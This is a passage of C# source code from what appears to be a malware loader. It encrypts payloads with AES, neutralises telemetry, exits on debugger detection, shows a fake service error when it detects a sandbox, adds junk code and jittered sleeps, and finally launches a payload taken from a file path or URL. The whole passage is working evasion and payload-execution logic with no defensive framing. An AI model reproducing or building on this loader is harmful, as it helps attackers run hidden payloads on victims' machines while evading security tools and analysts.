            byte[] plain = readLocalFilePath(payloadPathOrUrl, FileMode.Open);
            byte[] blob = AesEncrypt(plain, aesKey);
            string outFile = payloadPathOrUrl + ".aes";
            File.WriteAllBytes(outFile, blob);
            Log("[+] Encrypted " + plain.Length + " bytes -> " + outFile);
            return;
        }

        if (string.IsNullOrEmpty(payloadPathOrUrl))
        {
            printHelp();
            Environment.Exit(0);
        }

        NeutralizeTelemetry();
        HardenRuntime();

        if (checkDebug && CheckDebugger())
            Environment.Exit(0);

        if (checkSandbox && CheckSandbox())
        {
            Console.WriteLine("[!] Failed to initialize service. Error 0x80070002");
            Environment.Exit(1);
        }

        if (DateTime.Now.Ticks % 9973 == 0)
            OpaqueJunk();

        SleepJitter(sleepSeconds);

        int secProTypeHolde = (Convert.ToInt32("384") * Convert.ToInt32("8")) | Convert.ToInt32("12288"); // TLS 1.2 | TLS 1.3
        TriggerPayload(payloadPathOrUrl, payloadArgs, aesEnc, aesKey, secProTypeHolde);
        Environment.Exit(0);
    }

}
